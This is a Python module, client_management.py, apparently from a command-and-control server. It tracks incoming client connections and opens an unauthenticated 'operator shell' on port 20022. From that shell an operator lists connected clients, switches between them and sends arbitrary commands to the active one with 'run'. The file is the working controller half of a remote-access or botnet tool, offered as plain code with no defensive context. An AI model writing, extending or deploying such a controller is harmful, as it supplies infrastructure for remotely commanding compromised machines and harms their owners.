# server_code/client_management.py

import logging
import threading
import socket
import sys

from server_code.banner import get_operator_banner

class ClientManagement:
    """
    Manages client connections + an Operator Shell on port 20022.
    This is *not* stored in ENABLED_PLUGINS. It's a core module that MainServer calls.
    """

    def __init__(self, main_server):
        self.main_server = main_server
        self.connections = {}  # connection_id -> (conn, addr)
        self.next_id = 1
        self.active_connection_id = None
        self.lock = threading.Lock()

        # Operator shell
        self.operator_socket = None
        self.running_shell = False
        self.operator_shell_port = 20022
        self.operator_connections = 0  # track how many operator sessions

    def register(self, server_socket):
        """
        Perform setup upon creation. 
        """
        logging.info("[ClientManagement] Operator shell will be launched.")
        self.launch_operator_shell()
        return server_socket

    def unregister(self, server_socket):
        """
        Perform cleanup if needed, stopping the operator shell.
        """
        logging.info("[ClientManagement] Stopping operator shell.")
        self.stop_operator_shell()
        return server_socket

    # --------------------- CLIENT SESSIONS ---------------------

    def on_connection_accepted(self, conn, addr):
        with self.lock:
            conn_id = self.next_id
            self.next_id += 1
            self.connections[conn_id] = (conn, addr)
            logging.info(f"[ClientManagement] Connection #{conn_id} from {addr}")
            if self.active_connection_id is None:
                self.active_connection_id = conn_id

    def list_connections(self) -> str:
        """
        Lists only client connections made to the main server port (MAIN_PORT).
        Excludes connections from admin or operator shell ports.
        """
        with self.lock:
            if not self.connections:
                return "No active client connections."
            
            lines = []
            for cid, (conn, addr) in self.connections.items():
                # Filter connections to only those made to the MAIN_PORT
                if conn.getsockname()[1] == self.main_server.MAIN_PORT:
                    active_marker = " (ACTIVE)" if cid == self.active_connection_id else ""
                    lines.append(f"#{cid} -> {addr}{active_marker}")
            
            if not lines:
                return "No active client connections on the main server port."
            
            return "\n".join(lines)

    def switch_connection(self, new_id: int) -> str:
        with self.lock:
            if new_id in self.connections:
                self.active_connection_id = new_id
                return f"Switched to connection #{new_id}."
            else:
                return f"Connection #{new_id} does not exist."

    def close_connection(self, cid: int) -> str:
        with self.lock:
            if cid not in self.connections:
                return f"No connection #{cid} found."
            conn, addr = self.connections[cid]
            try:
                conn.close()
            except:
                pass
            del self.connections[cid]
            logging.info(f"[ClientManagement] Closed connection #{cid} from {addr}.")
            if self.active_connection_id == cid:
                self.active_connection_id = None
            return f"Connection #{cid} closed."

    # -------------------- OPERATOR SHELL --------------------

    def launch_operator_shell(self):
        if self.running_shell:
            logging.info("[ClientManagement] Operator shell already running.")
            return

        self.running_shell = True
        try:
            self.operator_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.operator_socket.bind((self.main_server.HOST, self.operator_shell_port))
            self.operator_socket.listen()
            logging.info(f"[ClientManagement] Operator shell on {self.main_server.HOST}:{self.operator_shell_port}")

            t = threading.Thread(target=self._operator_accept_loop, daemon=True)
            t.start()
        except Exception as e:
            logging.error(f"[ClientManagement] Failed to start operator shell on {self.operator_shell_port}: {e}")
            self.running_shell = False

    def stop_operator_shell(self):
        if not self.running_shell:
            return
        self.running_shell = False
        if self.operator_socket:
            try:
                self.operator_socket.close()
            except:
                pass
            self.operator_socket = None
        logging.info("[ClientManagement] Operator shell stopped.")

    def _operator_accept_loop(self):
        while self.running_shell:
            try:
                conn, addr = self.operator_socket.accept()
                t = threading.Thread(target=self._operator_session, args=(conn, addr), daemon=True)
                t.start()
            except OSError:
                break
            except Exception as e:
                logging.error(f"[ClientManagement] Operator shell accept error: {e}")
                break

    def _operator_session(self, conn, addr):
        logging.info(f"[ClientManagement] Operator shell connection from {addr}")
        with conn:
            try:
                self.operator_connections += 1

                banner = get_operator_banner()
                conn.sendall(banner.encode('utf-8') + b"\n> ")

                while True:
                    data = conn.recv(4096)
                    if not data:
                        break
                    line = data.decode(errors='replace').strip()
                    if not line:
                        conn.sendall(b"> ")
                        continue

                    result = self._handle_operator_command(line)
                    conn.sendall(result.encode('utf-8') + b"\n> ")

                    if line.lower() in ("exit", "quit"):
                        break
            except Exception as e:
                logging.error(f"[ClientManagement] Operator shell session error: {e}")
            finally:
                self.operator_connections -= 1

    def _handle_operator_command(self, line: str) -> str:
        parts = line.split()
        if not parts:
            return ""

        cmd = parts[0].lower()

        if cmd in ("help", "?"):
            return (
                "Operator Shell Commands:\n"
                "  help / ?               - This help.\n"
                "  list                   - List connected clients.\n"
                "  connect <id>           - Switch active client session.\n"
                "  run <command>          - Run a command on the ACTIVE client.\n"
                "  close <id>             - Close a client connection by ID.\n"
                "  exit / quit            - Exit operator shell.\n"
            )
        elif cmd == "list":
            return self.list_connections()
        elif cmd == "connect" and len(parts) == 2:
            try:
                cid = int(parts[1])
                return self.switch_connection(cid)
            except ValueError:
                return "Usage: connect <integer_client_id>"
        elif cmd == "close" and len(parts) == 2:
            try:
                cid = int(parts[1])
                return self.close_connection(cid)
            except ValueError:
                return "Usage: close <integer_client_id>"
        elif cmd == "run":
            return self._run_on_active_client(" ".join(parts[1:]))
        elif cmd in ("exit", "quit"):
            return "Goodbye."
        else:
            return f"Unknown command '{line}'. Type 'help' for usage."

    def _run_on_active_client(self, command_str: str) -> str:
        with self.lock:
            if not self.active_connection_id:
                return "No active client selected."
            if self.active_connection_id not in self.connections:
                return f"Active client (#{self.active_connection_id}) not found."

            conn, addr = self.connections[self.active_connection_id]

        try:
            conn.sendall(command_str.encode('utf-8'))
            return f"Sent command to client #{self.active_connection_id}: {command_str}"
        except Exception as e:
            return f"Failed to send command to client #{self.active_connection_id}: {e}"

    # --------------------- STATUS HELPERS ---------------------

    def get_operator_shell_info(self) -> str:
        """
        Return info about the operator shell: port, status, # of operator sessions.
        """
        status = f"Operator Shell Port: {self.operator_shell_port}"
        running_str = "RUNNING" if self.running_shell else "STOPPED"
        status += f" (Status: {running_str}), Operator connections: {self.operator_connections}"
        return status

    def get_client_count(self) -> int:
        with self.lock:
            return len(self.connections)